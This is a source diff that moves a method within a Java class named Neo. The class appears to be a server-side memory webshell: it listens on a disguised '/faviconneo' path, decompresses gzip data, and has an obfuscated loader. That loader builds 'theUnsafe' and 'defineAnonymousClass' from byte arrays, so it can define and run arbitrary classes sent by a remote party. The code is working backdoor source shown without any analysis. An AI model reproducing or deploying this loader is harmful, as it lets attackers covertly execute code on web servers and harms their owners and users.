@@ -4,6 +4,16 @@ public class Neo {
     private static final String pathPattern= "/faviconneo";
     public static java.util.Map<String,Object> namespace = new java.util.HashMap<String,Object>();
 
+    public static Class loader(byte[] bytes) throws Exception {
+        java.lang.reflect.Field field = sun.misc.Unsafe.class.getDeclaredField(new String(new byte[]{116,104,101,85,110,115,97,102,101}));
+        field.setAccessible(true);
+        Object unsafe = field.get(null);
+        java.lang.reflect.Method m = sun.misc.Unsafe.class.getDeclaredMethod(new String(new byte[]{100,101,102,105,110,101,65,110,111,110,121,109,111,117,115,67,108,97,115,115}), new Class[]{Class.class, byte[].class, Object[].class});
+        m.setAccessible(true);
+        Class clazz = (Class) m.invoke(unsafe, new Object[]{java.io.File.class, bytes, null});
+        return clazz;
+    }
+
     public static byte[] unGzip(byte[] bytes) throws Exception{
         java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
         java.io.ByteArrayInputStream in = new java.io.ByteArrayInputStream(bytes);
@@ -13,16 +23,6 @@ public class Neo {
         while ((n = ungzip.read(buffer)) >= 0)
             out.write(buffer, 0, n);
         return out.toByteArray();
-    }
-
-    public static Class loader(byte[] bytes) throws Exception {
-        java.lang.reflect.Field field = sun.misc.Unsafe.class.getDeclaredField(new String(new byte[]{116,104,101,85,110,115,97,102,101}));
-        field.setAccessible(true);
-        Object unsafe = field.get(null);
-        java.lang.reflect.Method m = sun.misc.Unsafe.class.getDeclaredMethod(new String(new byte[]{100,101,102,105,110,101,65,110,111,110,121,109,111,117,115,67,108,97,115,115}), new Class[]{Class.class, byte[].class, Object[].class});
-        m.setAccessible(true);
-        Class clazz = (Class) m.invoke(unsafe, new Object[]{java.io.File.class, bytes, null});
-        return clazz;
     }
 
     public static void doService(Object obj, String url, String method, java.io.InputStream in) {
